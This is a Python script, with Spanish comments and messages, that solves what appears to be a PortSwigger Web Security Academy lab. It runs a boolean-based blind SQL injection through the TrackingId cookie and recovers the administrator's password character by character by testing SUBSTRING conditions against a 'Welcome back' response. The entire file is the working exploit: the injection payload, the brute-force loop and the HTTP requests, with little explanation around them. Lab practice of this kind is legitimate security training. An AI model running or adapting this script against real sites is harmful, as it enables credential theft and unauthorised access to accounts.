#!/usr/bin/python3

from pwn import *
from termcolor import colored
import requests
import signal
import string
import time
import sys  # Faltaba

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo... \n", 'red'))
    p1.failure("Ataque de fuerza bruta detenido")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLI")

def makeSQLI():
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)

    password = ""
    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            payload = f"hhykihtHvehEUBPw' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{character}'-- -"

            cookies = {
                'TrackingId': payload,
                'session': "o74rxJM1U5y3kHXCrNxyXmQjOemNXNiv"
            }

            p1.status(f"Probando posición {position} con: {character}")

            r = requests.get("https://0a8000bb044467e981993e0400f4002d.web-security-academy.net/", cookies=cookies)

            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLI()
